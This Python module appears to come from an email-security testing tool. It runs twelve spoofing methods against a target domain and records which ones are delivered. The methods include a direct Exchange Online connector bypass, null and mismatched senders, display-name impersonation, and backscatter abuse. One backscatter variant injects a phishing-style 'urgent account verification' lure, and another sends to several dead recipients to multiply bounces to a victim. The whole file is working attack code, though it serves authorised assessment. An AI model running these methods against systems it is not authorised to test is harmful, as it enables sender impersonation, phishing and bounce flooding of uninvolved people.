import smtplib
import socket
import uuid
from email.mime.text import MIMEText
from email.utils import formatdate
from typing import Dict, List, Optional

from .config import config
from .dns_utils import query_mx, query_a, resolve_ipv4
from .checks.ghost import derive_exo_endpoint, mx_points_to_exo, exo_endpoint_resolves
from . import logger

LOREM_IPSUM = (
   "Lorem ipsum dolor sit amet, consectetur adipiscing elit. "
   "Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. "
   "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris "
   "nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in "
   "reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur."
)

SUBJECT = "Security Test"


def _sender_domain(sender: str) -> str:
   return sender.split("@")[1] if "@" in sender else "mail.local"


def build_email(sender: str, recipient: str, method: str = "",
                from_override: str = "") -> MIMEText:
   subject = f"{SUBJECT} - {method}" if method else SUBJECT
   domain = _sender_domain(from_override or sender)
   msg = MIMEText(LOREM_IPSUM, "plain", "utf-8")
   msg["From"] = from_override or sender
   msg["To"] = recipient
   msg["Subject"] = subject
   msg["Date"] = formatdate(localtime=True)
   msg["Message-ID"] = f"<{uuid.uuid4()}@{domain}>"
   msg["X-Oletros"] = "https://oletros.io/"
   return msg


def _resolve_mx_sorted(domain: str) -> List[tuple]:
   records = query_mx(domain)
   return sorted(records, key=lambda x: x[0]) if records else []


def resolve_recipient_mx(recipient: str) -> List[tuple]:
   return _resolve_mx_sorted(recipient.split("@")[1])


def smtp_deliver(host: str, port: int, envelope_from: str, recipient: str,
                 msg: MIMEText, ehlo_host: str, timeout: float = 10.0) -> Dict:
   result = {
      "server": f"{host}:{port}",
      "connected": False,
      "banner": "",
      "starttls": False,
      "ehlo_code": 0,
      "mail_from_code": 0,
      "mail_from_msg": "",
      "rcpt_to_code": 0,
      "rcpt_to_msg": "",
      "data_code": 0,
      "data_msg": "",
      "delivered": False,
      "error": "",
   }

   conn = None
   try:
      conn = smtplib.SMTP(timeout=timeout)
      ip = resolve_ipv4(host, port)
      code, banner = conn.connect(ip, port)
      result["connected"] = True
      result["banner"] = banner.decode(errors="replace")

      code, resp = conn.ehlo(ehlo_host)
      result["ehlo_code"] = code
      if code != 250:
         result["error"] = f"EHLO rejected: {code}"
         return result

      if conn.has_extn("STARTTLS"):
         try:
            conn.starttls()
            conn.ehlo(ehlo_host)
            result["starttls"] = True
         except Exception:
            pass

      code, resp = conn.mail(envelope_from)
      result["mail_from_code"] = code
      result["mail_from_msg"] = resp.decode(errors="replace")
      if code != 250:
         return result

      code, resp = conn.rcpt(recipient)
      result["rcpt_to_code"] = code
      result["rcpt_to_msg"] = resp.decode(errors="replace")
      if code != 250:
         return result

      code, resp = conn.data(msg.as_bytes())
      result["data_code"] = code
      result["data_msg"] = resp.decode(errors="replace")
      if 200 <= code < 300:
         result["delivered"] = True

   except smtplib.SMTPDataError as exc:
      result["data_code"] = exc.smtp_code
      err = exc.smtp_error
      result["data_msg"] = err.decode(errors="replace") if isinstance(err, bytes) else str(err)
   except smtplib.SMTPServerDisconnected as exc:
      result["error"] = f"disconnected: {exc}"
   except (smtplib.SMTPConnectError, socket.timeout, TimeoutError) as exc:
      result["error"] = f"connection timeout: {exc}"
   except OSError as exc:
      result["error"] = f"network error: {exc}"
   finally:
      if conn:
         try:
            conn.quit()
         except Exception:
            pass

   return result


def _relay_configured() -> bool:
   return bool(config.smtp_relay_host and config.smtp_relay_user and config.smtp_relay_pass)


def relay_deliver(envelope_from: str, recipient: str, msg: MIMEText,
                  timeout: float = 10.0) -> Dict:
   host = config.smtp_relay_host
   port = config.smtp_relay_port
   result = {
      "server": f"{host}:{port} (relay)",
      "connected": False,
      "banner": "",
      "starttls": False,
      "authenticated": False,
      "ehlo_code": 0,
      "mail_from_code": 0,
      "mail_from_msg": "",
      "rcpt_to_code": 0,
      "rcpt_to_msg": "",
      "data_code": 0,
      "data_msg": "",
      "delivered": False,
      "error": "",
   }

   conn = None
   try:
      if port == 465:
         conn = smtplib.SMTP_SSL(host, port, timeout=timeout)
      else:
         conn = smtplib.SMTP(host, port, timeout=timeout)
      result["connected"] = True

      code, resp = conn.ehlo()
      result["ehlo_code"] = code
      if code != 250:
         result["error"] = f"EHLO rejected: {code}"
         return result

      if port != 465 and conn.has_extn("STARTTLS"):
         conn.starttls()
         conn.ehlo()
         result["starttls"] = True

      conn.login(config.smtp_relay_user, config.smtp_relay_pass)
      result["authenticated"] = True

      code, resp = conn.mail(envelope_from)
      result["mail_from_code"] = code
      result["mail_from_msg"] = resp.decode(errors="replace")
      if code != 250:
         return result

      code, resp = conn.rcpt(recipient)
      result["rcpt_to_code"] = code
      result["rcpt_to_msg"] = resp.decode(errors="replace")
      if code != 250:
         return result

      code, resp = conn.data(msg.as_bytes())
      result["data_code"] = code
      result["data_msg"] = resp.decode(errors="replace")
      if 200 <= code < 300:
         result["delivered"] = True

   except smtplib.SMTPAuthenticationError as exc:
      err = exc.smtp_error
      result["error"] = f"auth failed: {err.decode(errors='replace') if isinstance(err, bytes) else str(err)}"
   except smtplib.SMTPDataError as exc:
      result["data_code"] = exc.smtp_code
      err = exc.smtp_error
      result["data_msg"] = err.decode(errors="replace") if isinstance(err, bytes) else str(err)
   except smtplib.SMTPServerDisconnected as exc:
      result["error"] = f"disconnected: {exc}"
   except (smtplib.SMTPConnectError, socket.timeout, TimeoutError) as exc:
      result["error"] = f"connection timeout: {exc}"
   except OSError as exc:
      result["error"] = f"network error: {exc}"
   finally:
      if conn:
         try:
            conn.quit()
         except Exception:
            pass

   return result


def _format_reason(result: Dict) -> str:
   if result.get("error"):
      return result["error"]
   if result.get("delivered"):
      return f"{result.get('data_code', 250)} {result.get('data_msg', 'OK')}"
   if result.get("mail_from_code", 0) >= 400:
      return f"MAIL FROM {result['mail_from_code']} {result['mail_from_msg']}"
   if result.get("rcpt_to_code", 0) >= 400:
      return f"RCPT TO {result['rcpt_to_code']} {result['rcpt_to_msg']}"
   if result.get("data_code", 0) >= 400:
      return f"DATA {result['data_code']} {result['data_msg']}"
   return "unknown"


def _try_mx_delivery(mx_records: list, envelope_from: str, recipient: str,
                     msg: MIMEText, ehlo_host: str, timeout: float) -> Optional[Dict]:
   last = None
   for _pref, exchange in mx_records:
      result = smtp_deliver(exchange, 25, envelope_from, recipient, msg, ehlo_host, timeout)
      last = result
      if result["connected"]:
         return result
   return last


def _status_from_result(result: Dict) -> str:
   if result["delivered"]:
      return "delivered"
   if result["connected"]:
      return "rejected"
   return "error"


def _make_result(method: str, result: Dict) -> Dict:
   return {"method": method, "status": _status_from_result(result),
           "server": result["server"], "reason": _format_reason(result), "smtp": result}


def method_direct(sender: str, recipient: str, timeout: float) -> Dict:
   msg = build_email(sender, recipient, "direct")

   if _relay_configured():
      result = relay_deliver(sender, recipient, msg, timeout)
      return _make_result("direct", result)

   ehlo = f"mail.{_sender_domain(sender)}"
   mx_records = resolve_recipient_mx(recipient)
   if not mx_records:
      return {"method": "direct", "status": "error", "server": "-",
              "reason": "no MX for recipient domain"}

   result = _try_mx_delivery(mx_records, sender, recipient, msg, ehlo, timeout)
   if not result:
      return {"method": "direct", "status": "error", "server": "-",
              "reason": "all MX unreachable"}

   return _make_result("direct", result)


def method_ghost(sender: str, recipient: str, timeout: float) -> Dict:
   msg = build_email(sender, recipient, "ghost")
   ehlo = f"mail.{_sender_domain(sender)}"
   recipient_domain = recipient.split("@")[1]
   endpoint = derive_exo_endpoint(recipient_domain)
   exo_ips = exo_endpoint_resolves(endpoint)

   if not exo_ips:
      return {"method": "ghost", "status": "skip", "server": endpoint,
              "reason": "recipient not on Exchange Online"}

   mx_direct, _, _ = mx_points_to_exo(recipient_domain)
   if mx_direct:
      return {"method": "ghost", "status": "skip", "server": endpoint,
              "reason": "MX already direct to EXO (no bypass path)"}

   result = smtp_deliver(endpoint, 25, sender, recipient, msg, ehlo, timeout)
   return _make_result("ghost", result)


def method_null_from(sender: str, recipient: str, timeout: float) -> Dict:
   msg = build_email(sender, recipient, "null_from")

   if _relay_configured():
      result = relay_deliver("", recipient, msg, timeout)
      return _make_result("null_from", result)

   ehlo = f"mail.{_sender_domain(sender)}"
   mx_records = resolve_recipient_mx(recipient)
   if not mx_records:
      return {"method": "null_from", "status": "error", "server": "-",
              "reason": "no MX for recipient domain"}

   result = _try_mx_delivery(mx_records, "", recipient, msg, ehlo, timeout)
   if not result:
      return {"method": "null_from", "status": "error", "server": "-",
              "reason": "all MX unreachable"}

   return _make_result("null_from", result)


def method_subdomain(domain: str, recipient: str, timeout: float) -> Dict:
   sub_sender = f"mercure@nonexistent.{domain}"
   sub_msg = build_email(sub_sender, recipient, "subdomain")

   if _relay_configured():
      result = relay_deliver(sub_sender, recipient, sub_msg, timeout)
      return _make_result("subdomain", result)

   ehlo = f"mail.nonexistent.{domain}"
   mx_records = resolve_recipient_mx(recipient)
   if not mx_records:
      return {"method": "subdomain", "status": "error", "server": "-",
              "reason": "no MX for recipient domain"}

   result = _try_mx_delivery(mx_records, sub_sender, recipient, sub_msg, ehlo, timeout)
   if not result:
      return {"method": "subdomain", "status": "error", "server": "-",
              "reason": "all MX unreachable"}

   return _make_result("subdomain", result)


def method_relay(sender: str, domain: str, recipient: str, timeout: float) -> Dict:
   msg = build_email(sender, recipient, "relay")
   ehlo = f"mail.{domain}"
   mx_records = _resolve_mx_sorted(domain)
   if not mx_records:
      return {"method": "relay", "status": "skip", "server": "-",
              "reason": "no MX for sender domain"}

   result = _try_mx_delivery(mx_records, sender, recipient, msg, ehlo, timeout)
   if not result:
      return {"method": "relay", "status": "error", "server": "-",
              "reason": "all MX unreachable"}

   return _make_result("relay", result)


def method_mismatch(sender: str, recipient: str, timeout: float) -> Dict:
   envelope_domain = f"bounce-{uuid.uuid4().hex[:6]}.local"
   envelope_from = f"noreply@{envelope_domain}"
   msg = build_email(sender, recipient, "mismatch")

   if _relay_configured():
      result = relay_deliver(envelope_from, recipient, msg, timeout)
      return _make_result("mismatch", result)

   ehlo = f"mail.{envelope_domain}"
   mx_records = resolve_recipient_mx(recipient)
   if not mx_records:
      return {"method": "mismatch", "status": "error", "server": "-",
              "reason": "no MX for recipient domain"}

   result = _try_mx_delivery(mx_records, envelope_from, recipient, msg, ehlo, timeout)
   if not result:
      return {"method": "mismatch", "status": "error", "server": "-",
              "reason": "all MX unreachable"}

   return _make_result("mismatch", result)


def method_display_name(sender: str, domain: str, recipient: str,
                        timeout: float) -> Dict:
   display_from = f'"{sender}" <noreply@notifications.{domain}>'
   envelope_from = f"noreply@notifications.{domain}"
   msg = build_email(sender, recipient, "display_name",
                     from_override=display_from)

   if _relay_configured():
      result = relay_deliver(envelope_from, recipient, msg, timeout)
      return _make_result("display_name", result)

   ehlo = f"mail.notifications.{domain}"
   mx_records = resolve_recipient_mx(recipient)
   if not mx_records:
      return {"method": "display_name", "status": "error", "server": "-",
              "reason": "no MX for recipient domain"}

   result = _try_mx_delivery(mx_records, envelope_from, recipient, msg, ehlo, timeout)
   if not result:
      return {"method": "display_name", "status": "error", "server": "-",
              "reason": "all MX unreachable"}

   return _make_result("display_name", result)


def method_internal(sender: str, domain: str, recipient: str,
                    timeout: float) -> Dict:
   recipient_domain = recipient.split("@")[1].lower()
   if recipient_domain != domain.lower():
      return {"method": "internal", "status": "skip", "server": "-",
              "reason": f"recipient not in target domain ({recipient_domain} != {domain})"}

   msg = build_email(sender, recipient, "internal")
   ehlo = f"mail.{domain}"
   mx_records = _resolve_mx_sorted(domain)
   if not mx_records:
      return {"method": "internal", "status": "error", "server": "-",
              "reason": "no MX for target domain"}

   result = _try_mx_delivery(mx_records, sender, recipient, msg, ehlo, timeout)
   if not result:
      return {"method": "internal", "status": "error", "server": "-",
              "reason": "all MX unreachable"}

   return _make_result("internal", result)


def method_backscatter(domain: str, recipient: str, timeout: float) -> Dict:
   dead_rcpt = f"user.{uuid.uuid4().hex[:6]}@{domain}"
   msg = build_email(f"noreply@{domain}", dead_rcpt, "backscatter")
   ehlo = f"mail.{_sender_domain(recipient)}"
   mx_records = _resolve_mx_sorted(domain)
   if not mx_records:
      return {"method": "backscatter", "status": "error", "server": "-",
              "reason": "no MX for target domain"}

   result = _try_mx_delivery(mx_records, recipient, dead_rcpt, msg, ehlo, timeout)
   if not result:
      return {"method": "backscatter", "status": "error", "server": "-",
              "reason": "all MX unreachable"}

   return _make_result("backscatter", result)


INJECT_BODY = (
   "URGENT: Your account security requires immediate verification.\n\n"
   "An unauthorized access attempt was detected from an unrecognized device.\n"
   "Please review your recent activity and confirm your identity immediately.\n\n"
   "If you did not initiate this request, your credentials may be compromised.\n"
   "Contact the IT Security team at security@{domain} or call ext. 4401.\n\n"
   "Reference: SEC-{ref}\n"
   "Priority: Critical\n"
   "Department: Information Security\n\n"
   "This notification was generated automatically by the security monitoring system.\n"
   "Do not reply to this message. Do not forward this message."
)


def method_bs_inject(domain: str, recipient: str, timeout: float) -> Dict:
   dead_rcpt = f"user.{uuid.uuid4().hex[:6]}@{domain}"
   ref = uuid.uuid4().hex[:12].upper()
   body = INJECT_BODY.format(domain=domain, ref=ref)
   msg = MIMEText(body, "plain", "utf-8")
   msg["From"] = f"security-alert@{domain}"
   msg["To"] = dead_rcpt
   msg["Subject"] = f"Security Test - bs_inject - Account Alert REF-{ref}"
   msg["Date"] = formatdate(localtime=True)
   msg["Message-ID"] = f"<{uuid.uuid4()}@{domain}>"
   msg["X-Priority"] = "1"
   msg["Importance"] = "High"
   msg["X-Oletros"] = "https://oletros.io/"

   ehlo = f"mail.{_sender_domain(recipient)}"
   mx_records = _resolve_mx_sorted(domain)
   if not mx_records:
      return {"method": "bs_inject", "status": "error", "server": "-",
              "reason": "no MX for target domain"}

   result = _try_mx_delivery(mx_records, recipient, dead_rcpt, msg, ehlo, timeout)
   if not result:
      return {"method": "bs_inject", "status": "error", "server": "-",
              "reason": "all MX unreachable"}

   return _make_result("bs_inject", result)


AMP_DEAD_COUNT = 5


def _amp_smtp_deliver(host: str, port: int, envelope_from: str,
                      dead_recipients: List[str], msg: MIMEText,
                      ehlo_host: str, timeout: float) -> Dict:
   result = {
      "server": f"{host}:{port}",
      "connected": False,
      "banner": "",
      "starttls": False,
      "ehlo_code": 0,
      "mail_from_code": 0,
      "mail_from_msg": "",
      "rcpt_to_code": 0,
      "rcpt_to_msg": "",
      "data_code": 0,
      "data_msg": "",
      "delivered": False,
      "error": "",
      "accepted_count": 0,
      "rejected_count": 0,
      "total_recipients": len(dead_recipients),
   }

   conn = None
   try:
      conn = smtplib.SMTP(timeout=timeout)
      ip = resolve_ipv4(host, port)
      code, banner = conn.connect(ip, port)
      result["connected"] = True
      result["banner"] = banner.decode(errors="replace")

      code, resp = conn.ehlo(ehlo_host)
      result["ehlo_code"] = code
      if code != 250:
         result["error"] = f"EHLO rejected: {code}"
         return result

      if conn.has_extn("STARTTLS"):
         try:
            conn.starttls()
            conn.ehlo(ehlo_host)
            result["starttls"] = True
         except Exception:
            pass

      code, resp = conn.mail(envelope_from)
      result["mail_from_code"] = code
      result["mail_from_msg"] = resp.decode(errors="replace")
      if code != 250:
         return result

      for rcpt in dead_recipients:
         code, resp = conn.rcpt(rcpt)
         if code == 250:
            result["accepted_count"] += 1
         else:
            result["rejected_count"] += 1
         result["rcpt_to_code"] = code
         result["rcpt_to_msg"] = resp.decode(errors="replace")

      if result["accepted_count"] > 0:
         code, resp = conn.data(msg.as_bytes())
         result["data_code"] = code
         result["data_msg"] = resp.decode(errors="replace")
         if 200 <= code < 300:
            result["delivered"] = True
      elif result["rejected_count"] == len(dead_recipients):
         pass

   except smtplib.SMTPDataError as exc:
      result["data_code"] = exc.smtp_code
      err = exc.smtp_error
      result["data_msg"] = err.decode(errors="replace") if isinstance(err, bytes) else str(err)
   except smtplib.SMTPServerDisconnected as exc:
      result["error"] = f"disconnected: {exc}"
   except (smtplib.SMTPConnectError, socket.timeout, TimeoutError) as exc:
      result["error"] = f"connection timeout: {exc}"
   except OSError as exc:
      result["error"] = f"network error: {exc}"
   finally:
      if conn:
         try:
            conn.quit()
         except Exception:
            pass

   return result


def _amp_format_reason(result: Dict) -> str:
   if result.get("error"):
      return result["error"]
   accepted = result.get("accepted_count", 0)
   rejected = result.get("rejected_count", 0)
   total = result.get("total_recipients", 0)
   if result.get("delivered"):
      return f"{accepted}/{total} accepted, {accepted} potential NDRs to victim"
   if rejected == total:
      return f"all {total} recipients rejected (server validates before accept)"
   base = _format_reason(result)
   return f"{accepted}/{total} accepted - {base}"


def method_bs_amp(domain: str, recipient: str, timeout: float) -> Dict:
   dead_recipients = [f"user.{uuid.uuid4().hex[:6]}@{domain}" for _ in range(AMP_DEAD_COUNT)]
   msg = build_email(f"noreply@{domain}", dead_recipients[0], "bs_amp")
   ehlo = f"mail.{_sender_domain(recipient)}"
   mx_records = _resolve_mx_sorted(domain)
   if not mx_records:
      return {"method": "bs_amp", "status": "error", "server": "-",
              "reason": "no MX for target domain"}

   result = None
   for _pref, exchange in mx_records:
      result = _amp_smtp_deliver(exchange, 25, recipient, dead_recipients,
                                 msg, ehlo, timeout)
      if result["connected"]:
         break

   if not result:
      return {"method": "bs_amp", "status": "error", "server": "-",
              "reason": "all MX unreachable"}

   status = _status_from_result(result)
   return {"method": "bs_amp", "status": status, "server": result["server"],
           "reason": _amp_format_reason(result), "smtp": result}


OOB_TARGETS = ["info", "contact", "support", "reception", "hello", "office"]


def method_bs_oob(domain: str, recipient: str, timeout: float) -> Dict:
   oob_rcpt = f"{OOB_TARGETS[0]}@{domain}"
   msg = build_email(f"noreply@{domain}", oob_rcpt, "bs_oob")
   ehlo = f"mail.{_sender_domain(recipient)}"
   mx_records = _resolve_mx_sorted(domain)
   if not mx_records:
      return {"method": "bs_oob", "status": "error", "server": "-",
              "reason": "no MX for target domain"}

   best_result = None
   accepted_target = None
   for target_local in OOB_TARGETS:
      target_addr = f"{target_local}@{domain}"
      msg_oob = build_email(f"noreply@{domain}", target_addr, "bs_oob")

      for _pref, exchange in mx_records:
         result = smtp_deliver(exchange, 25, recipient, target_addr,
                               msg_oob, ehlo, timeout)
         if result["connected"]:
            if result["delivered"]:
               best_result = result
               accepted_target = target_addr
               break
            if not best_result or not best_result["connected"]:
               best_result = result
               accepted_target = target_addr
            break

      if best_result and best_result.get("delivered"):
         break

   if not best_result:
      return {"method": "bs_oob", "status": "error", "server": "-",
              "reason": "all MX unreachable"}

   base = _make_result("bs_oob", best_result)
   if best_result.get("delivered") and accepted_target:
      base["reason"] = f"auto-reply vector: {accepted_target} accepted, return-path={recipient}"
   elif best_result.get("connected") and accepted_target:
      base["reason"] = f"{accepted_target} rejected ({_format_reason(best_result)})"
   return base


def run_spoof(domain: str, recipient: str, timeout: float = 10.0) -> List[Dict]:
   sender = f"mercure@{domain}"

   if _relay_configured():
      logger.info(f"relay configured: {config.smtp_relay_host}:{config.smtp_relay_port} ({config.smtp_relay_user})")
   else:
      logger.info("no relay configured, using direct MX delivery")

   methods = [
      ("direct", lambda: method_direct(sender, recipient, timeout)),
      ("ghost", lambda: method_ghost(sender, recipient, timeout)),
      ("null_from", lambda: method_null_from(sender, recipient, timeout)),
      ("subdomain", lambda: method_subdomain(domain, recipient, timeout)),
      ("relay", lambda: method_relay(sender, domain, recipient, timeout)),
      ("mismatch", lambda: method_mismatch(sender, recipient, timeout)),
      ("display_name", lambda: method_display_name(sender, domain, recipient, timeout)),
      ("internal", lambda: method_internal(sender, domain, recipient, timeout)),
      ("backscatter", lambda: method_backscatter(domain, recipient, timeout)),
      ("bs_inject", lambda: method_bs_inject(domain, recipient, timeout)),
      ("bs_amp", lambda: method_bs_amp(domain, recipient, timeout)),
      ("bs_oob", lambda: method_bs_oob(domain, recipient, timeout)),
   ]

   results = []
   for name, fn in methods:
      logger.info(f"spoofing method: {name}")
      try:
         result = fn()
         results.append(result)
         st = result["status"]
         reason = result["reason"]
         if st == "delivered":
            logger.warning(f"  {name}: DELIVERED - {reason}")
         elif st == "rejected":
            logger.info(f"  {name}: REJECTED - {reason}")
         elif st == "skip":
            logger.info(f"  {name}: SKIPPED - {reason}")
         else:
            logger.error(f"  {name}: ERROR - {reason}")
      except Exception as exc:
         logger.error(f"  {name}: exception - {exc}")
         results.append({"method": name, "status": "error", "server": "-", "reason": str(exc)})

   return results
